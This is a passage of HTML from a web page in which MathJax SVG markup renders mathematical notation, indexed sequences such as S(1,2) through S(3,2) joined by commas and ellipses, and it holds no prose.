transform="translate(1667,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(4744.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(5189,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(6527.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(6972.3,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(646,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1167,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1000,0)"></path></g><g data-mml-node="mo" transform="translate(2667,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></g></g></svg></mjx-container></p>
<p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.8ex;" xmlns="http://www.w3.org/2000/svg" width="22.238ex" height="2.395ex" role="img" focusable="false" viewBox="0 -705 9829.2 1058.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(646,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1167,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(1667,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2149.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2594.5,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(646,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1167,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1667,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(4744.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(5189,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(6527.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(6972.3,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(646,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1167,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1000,0)"></path></g><g data-mml-node="mo" transform="translate(2667,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></g></g></svg></mjx-container></p>
<p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.8ex;" xmlns="http://www.w3.org/2000/svg" width="22.238ex" height="2.395ex" role="img" focusable="false" viewBox="0 -705 9829.2 1058.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(646,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1167,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(1667,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2149.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2594.5,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(646,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1167,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1667,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(4744.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(5189,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(6527.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(6972.3,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(646,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1167,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 